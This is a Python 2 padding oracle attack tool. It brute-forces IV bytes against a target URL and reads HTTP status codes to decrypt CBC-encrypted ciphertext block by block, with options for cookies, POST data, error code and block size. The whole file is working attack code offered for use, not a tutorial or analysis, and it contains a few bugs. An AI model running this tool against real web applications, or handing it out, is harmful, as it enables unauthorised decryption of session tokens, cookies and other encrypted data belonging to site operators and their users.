#!/usr/bin/python
import sys
import requests
import argparse
from requests.exceptions import ConnectionError

__author__ = 'khanhnnvn@gmail.com'
__url__ = ''

class PaddingOracleAttack:

    def __init__(self, base_url, method=None, cookies=None, data=None, error_code=403, bs=16):
        self.bs = bs
        self.base_url = base_url
        self.cookies = cookies
        self.data = data
        self.method = method
        self.error_code = error_code

    def get_status(self, url):
        try:
            if self.method == 'POST' or self.method == 'post':
                return requests.post(url, data=self.data, cookies=self.cookies)
            return requests.get(url, cookies=self.cookies).status_code
        except ConnectionError:
            print '\n[!] Error! Can\'t connect to host, please check manually and try again.'
            sys.exit()

    def fuzz_last_byte(self, valid_iv, block):
        num_byte = 1
        while num_byte < self.bs:
            for x in reversed(xrange(self.bs - num_byte)):
                valid_iv[x] += 1
                if self.get_status(self.base_url + str(valid_iv).encode('hex') + block) != self.error_code:
                    return num_byte
                else:
                    break
            num_byte += 1
        return num_byte

    def decrypt_block(self, block):
        byte_iv = bytearray(self.bs)
        intermediate_bytes = bytearray(self.bs)
        sys.stdout.write('[*] Bruting byte 1..')
        for i in xrange(256):
            byte_iv[-1] = i
            url = self.base_url + str(byte_iv).encode('hex') + block
            if self.get_status(url) == 404:
                num_byte = self.fuzz_last_byte(byte_iv, block)
                intermediate_bytes[-num_byte:] = xor_bytearray(byte_iv, num_byte)[-num_byte:]
                break
        while num_byte != self.bs:
            num_byte += 1
            if num_byte == 16:
                sys.stdout.write('{}\n'.format(str(num_byte)))
                sys.stdout.flush()
            else:
                sys.stdout.write('{}..'.format(str(num_byte)))
                sys.stdout.flush()
            byte_iv[-num_byte:] = xor_bytearray(intermediate_bytes, num_byte)[-num_byte:]
            for i in xrange(256):
                byte_iv[-num_byte] = i
                url = self.base_url + str(byte_iv).encode('hex') + block
                if self.get_status(url) != self.error_code:
                    intermediate_bytes[-num_byte] = i ^ num_byte
                    # print 'iv: %s' % str(byte_iv).encode('hex')
                    break
        print 'intermediate_bytes: %s' % str(intermediate_bytes).encode('hex')
        print 'iv: %s' % str(byte_iv).encode('hex')
        return str(intermediate_bytes)

    def decrypt_cipher(self, cipher):
        length = len(cipher)
        if length % (self.bs * 2) != 0 or length / (self.bs * 2) < 2:
            print '\n[!] Oops. Can\'t decrypt message with this length'
            sys.exit()
        result = ''
        block_size = self.bs * 2
        iv = cipher[:block_size]
        for i in range(block_size, len(cipher), block_size):
            print '[*] Decrypting block %d' % (i / block_size)
            prev_block = cipher[i - block_size:i]
            block = cipher[i:i + block_size]
            print 'block: %s\nprev_block: %s' % (block, prev_block)
            intermediate_decrypted = self.decrypt_block(block)
            block_decrypted = xor_str(intermediate_decrypted, prev_block.decode('hex'))
            result += block_decrypted
            print 'block_decrypted: %s\nhex(block_decrypted): %s\n' % (block_decrypted, block_decrypted.encode('hex'))
        return result

def xor_bytearray(byte_array, byte_padding):
    tmp = bytearray(byte_padding)
    for i in range(byte_padding):
        tmp[-(i + 1)] = byte_array[-(i + 1)] ^ byte_padding
    return tmp

def xor_str(fstr, sstr):
    return ''.join([chr(ord(a) ^ ord(b)) for a, b in zip(fstr, sstr)])

def unpad(plaintext, bs):
    last_byte = ord(plaintext[-1])
    if last_byte > bs:
        print 'Padding error!'
    else:
        return plaintext[:-last_byte]
class Parser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write('[!] Error: %s\n' % message)
        self.print_help()
        sys.exit()
if __name__ == '__main__':
    base_url = 'http://localhost:8080/?cipher='
    parser = Parser(prog=None, description='Simple padding oracle attack')
    parser.add_argument('-u', action='store', dest='base_url', help='URL')
    parser.add_argument('-c', action='store', dest='ciphertext', help='Ciphertext to decrypt')
    parser.add_argument('--cookies', action='store', dest='cookies', help='Use cookies')
    parser.add_argument('--method', action='store', dest='method', help='Request method')
    parser.add_argument('--data', action='store', dest='data', help='Payload to send (via POST)')
    parser.add_argument('--error-code', action='store', dest='error_code', help='Error code returned (403, 404, 500...)')
    parser.add_argument('--block-size', action='store', dest='block_size', help='Cipher block size')
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.error('Please specify least one argument')
    else:
        if not args.ciphertext:
            parser.error('Provide ciphetext to decrypt')
        if args.base_url:
            base_url = args.base_url
        try:
            attack = PaddingOracleAttack(base_url, args.method, args.cookies, args.data, int(args.error_code), int(args.block_size))
            result = attack.decrypt_cipher(args.ciphertext)
            print '========================\nDONE\n[*] Recoverd plaintext: %s' % unpad(result, args.block_size)
        except KeyboardInterrupt:
            print '\n[*] Canceled by user'
            sys.exit(1)
        # Comment out these bellow lines to debug
        except:
            print '\n[!] Something went wrong! Exiting...'
